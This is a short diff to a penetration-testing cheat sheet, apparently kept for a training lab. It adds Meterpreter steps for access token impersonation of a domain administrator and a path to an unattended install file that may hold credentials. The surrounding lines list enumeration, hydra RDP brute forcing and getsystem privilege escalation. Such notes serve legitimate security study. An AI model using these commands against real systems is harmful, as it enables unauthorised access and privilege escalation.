@@ -2,6 +2,16 @@ ENUM  -
 gobuster dir -u http://target.com -w /path/to/wordlist.txt
 enum4linux // smb*samba enum tool
 
+Access Token Impersonation -
+migrate to explorer // pgrep explorer // migrate pid
+getprivs // must have SeImpersonatePrivilege
+load incognito
+list_tokens -u
+impersonate_token "ATTACKDEFENSE\Administrator"
+migrate explorer
+
+
+
 RDP -
 rdp_scanner // in msf
 hydra - hydra -L usr.txt -P pass.txt rdp://ip -s port#
@@ -36,9 +46,10 @@ SIGN_INS -
 mysql -u username -p
 smbclient //192.168.1.1/sharename -U username
 sudo mount.cifs //192.168.1.1/sharename /mnt/localfolder -o username=user,password=pass
-xfreerdp /u:user /p:pass /V:ip:port#
+xfreerdp /u:user /p:pass /V:ip:port
 
 WINDOWS ESC -
+C:\Panther\unattended.xml
 getsystem //MSF
 suggester //MSF 
 suggester
